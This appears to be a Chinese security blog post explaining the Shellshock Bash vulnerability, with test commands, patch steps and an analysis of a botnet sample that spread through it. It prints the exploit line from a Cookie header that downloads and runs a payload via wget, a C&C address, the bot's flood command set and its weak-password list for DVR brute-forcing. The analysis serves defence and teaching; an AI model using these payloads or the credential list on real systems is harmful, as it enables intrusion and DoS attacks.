---
title: shellshock原理介绍
date: 2017-09-09 13:18:47
categories: pwn
tags: [shell, linux]
---

## **一.漏洞事件介绍**

### **1.漏洞信息**

```
●发布时间:2014-09-25　14时48分04秒
●CVE ID:CVE-2014-6271
●受影响版本:
```

[![受ShellShock影响的版本](http://image.3001.net/images/20140929/14119555774668.png%21small)](http://image.3001.net/images/20140929/14119555774668.png)

### **2.漏洞概述**

**Bash(GNU Bourne-Again Shell)**是大多数Linux系统以及Mac OS X v10.4默认的shell，它能运行于大多数Unix风格的操作系统之上，甚至被移植到了Microsoft Windows上的Cygwin系统中，以实现windows的POSIX虚拟接口.

Bash其广泛的使用将意味全球至少 150 万的主机将受到影响，此外 Linux/Unix 世界内的安卓和苹果都难以幸免。

[破壳漏洞（ShellShock）](http://www.freebuf.com/news/44805.html)的严重性被定义为 10 级（最高）,而今年 4 月爆发的 OpenSSL(心脏出血)漏洞才 5 级！

### **3.漏洞成因:**

Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统

受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令

### **4.漏洞测试:**

```shell
(1).CVE-2014-6271 测试方式:
      env x='() { :;}; exp' bash -c "echo this is a test" 
(2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
      env -i X=';() { (a)=>\' bash -c 'echo date'; cat echo
```

### **5.修复方案**

```
请广大站长及时关注官网的安全补丁更新
(1).针对RedHat、CentOS Liunx发行版本，请执行：
    yum -y update bash
(2).针对Debian Liunx发行版本，请执行：
    sudo apt-get update && sudo apt-get install --only-upgrade bash
```

## **二.样本概述**

### **●样本来源:**

由于2014年9月24日法国某Linux爱好者公布了BASH漏洞(CVE-2014-6721),时至今日网络上已有利用该漏洞的病毒样本,我们于今日捕获到该漏洞样本,并进行了紧急分析

### **●文件信息:**

文件名:nginx

文件大小:525KB

MD5:5924bcc045bb7039f55c6ce29234e29a  

[![Bash 样本文件信息](http://image.3001.net/images/20140929/14119556446899.png%21small)](http://image.3001.net/images/20140929/14119556446899.png)

### **●行为概述:**

该漏洞样本利用Bash漏洞进行传播扩散,并使用Linux Shell命令wget下载该样本并执行,该样本执行后首先会收集系统相关的信息(CPU,网络配置等信息),紧接着样本连接到自己的服务器,通过接受服务器发送的指令,来远程控制被感染机器,进而组建僵尸网络,进行洪水攻击,以及入侵中国某厂商,而入侵之后主要是为了莱特币的挖取

## **三.样本详细分析**

### **1.样本传播方式**

该样本利用Bash漏洞进行传播,其漏洞的利用只需要简单的几行命令即可,这无疑为利用者带来了极大的便利,利用代码如下:

[![Bash样本利用代码](http://image.3001.net/images/20140929/14119557242937.png%21small)](http://image.3001.net/images/20140929/14119557242937.png)

而该样本通过wget将样本下载并执行,利用漏洞命令如下:

```
Cookie, ().{.:;.};.wget /tmp/besh http://X.X.X.X/nginx; chmod.777 /tmp/besh; /tmp/besh; 
```

### **2.样本行为分析**

**(1).获取计算机相关信息**

该样本启动后首先会获取计算机的相关信息,如CPU,网络配置等信息

[![Bash样本获取计算机信息](http://image.3001.net/images/20140929/14119557383644.png%21small)](http://image.3001.net/images/20140929/14119557383644.png)

**(2).接着该样本连接自己的服务器(89.238.150.154:5)**

strace附加在创建的子进程样本上监视其行为如下:

[![Bash样本连接自己的服务器](http://image.3001.net/images/20140929/14119557523092.png%21small)](http://image.3001.net/images/20140929/14119557523092.png)

但是C&C的server已经挂掉了

**(3).如果连接服务器成功,则根据服务器传来的指令,远程控制被感染机器,命令集合如下:**

```
PING 
GETLOCALIP 
SCANNER 
HOLD (DoS Flood) 
JUNK (DoS Flood) 
UDP (DoS Flood) 
TCP (DoS Flood) 
KILLATTK 
LOLNOGTFO
```

**●PING命令:**

[![Bash样本服务器的PING命令](http://image.3001.net/images/20140929/14119557641898.png%21small)](http://image.3001.net/images/20140929/14119557641898.png)

类似于心跳包,测试客户端服务器是否连接成功

**●GETLOCALIP**

[![发送本机IP地址到目标服务器](http://image.3001.net/images/20140929/14119557764384.png%21small)](http://image.3001.net/images/20140929/14119557764384.png)

发送本机IP地址到目标服务器

**●SCANNER**

其主要是通过Busybox来对字符进行解析,从而设定扫描攻击目标,然后通过DVR scanner来对目标DVR设备进行扫描,看是否存在DVR漏洞,进而发起攻击

[![Bash样本SCANNER](http://image.3001.net/images/20140929/14119557914517.png%21small)](http://image.3001.net/images/20140929/14119557914517.png)

我们通过busybox来对该字符串进行解析得到

[![字符串剖析结果](http://image.3001.net/images/20140929/14119558016271.png%21small)](http://image.3001.net/images/20140929/14119558016271.png)

然而在样本中,我们发现:

[![Bash样本中DVR Scanner](http://image.3001.net/images/20140929/14119558124398.png%21small)](http://image.3001.net/images/20140929/14119558124398.png)

DVR Scanner主要测试目标是否存在DVR漏洞,如果存在则尝试通过像”root”,”12345”这样的弱口令进行进行连接,如果连接成功,则执行ps尝试寻找”cmd.so”进程,该进程主要是莱特币矿工相关.

于是可以高度怀疑通过此方法来挖取莱特币

程序中存在的弱口令表

```
root 
admin 
user 
login 
guest 
toor 
changeme 
1234 
12345 
123456 
default 
pass 
password
```

**●HOLD (Dos Flood)**

[![对目标服务器进行Hold洪水攻击](http://image.3001.net/images/20140929/14119558398157.png%21small)](http://image.3001.net/images/20140929/14119558398157.png)

对目标服务器进行Hold洪水攻击,通过接受服务器数据包,来指明需要攻击的秒数,并将攻击时间返回给服务器

**●JUNK (DoS Flood) **

[![对目标服务器进行JUNK洪水攻击](http://image.3001.net/images/20140929/14119558506793.png%21small)](http://image.3001.net/images/20140929/14119558506793.png)

对目标服务器进行JUNK洪水攻击

**●UDP (DoS Flood)** 

[![对目标服务器进行UDP洪水攻击](http://image.3001.net/images/20140929/14119558625359.png%21small)](http://image.3001.net/images/20140929/14119558625359.png)

对目标服务器进行UDP洪水攻击

**●TCP (DoS Flood) **

[![对目标服务器进行TCP洪水攻击](http://image.3001.net/images/20140929/14119558712704.png%21small)](http://image.3001.net/images/20140929/14119558712704.png)

对目标服务器进行TCP洪水攻击

**●KILLATTK **

[![通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程](http://image.3001.net/images/20140929/14119558833165.png%21small)](http://image.3001.net/images/20140929/14119558833165.png)

通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程

**●LOLNOGTFO**

[![非法服务器数据包指令](http://image.3001.net/images/20140929/14119558966991.png%21small)](http://image.3001.net/images/20140929/14119558966991.png)

非法服务器数据包指令

## **三.后台漏洞检测**

漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。

```
备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。XXX门将会再现江湖
```

为此我们搭建了一个后台页面,来对网址进行检测,查看是否存在Bash漏洞

[![ShellShock检测页面](http://image.3001.net/images/20140929/14119559071040.png%21small)](http://image.3001.net/images/20140929/14119559071040.png)

**检测网址如下:**

[http://fish.ijinshan.com/cgibincheck](http://fish.ijinshan.com/cgibincheck)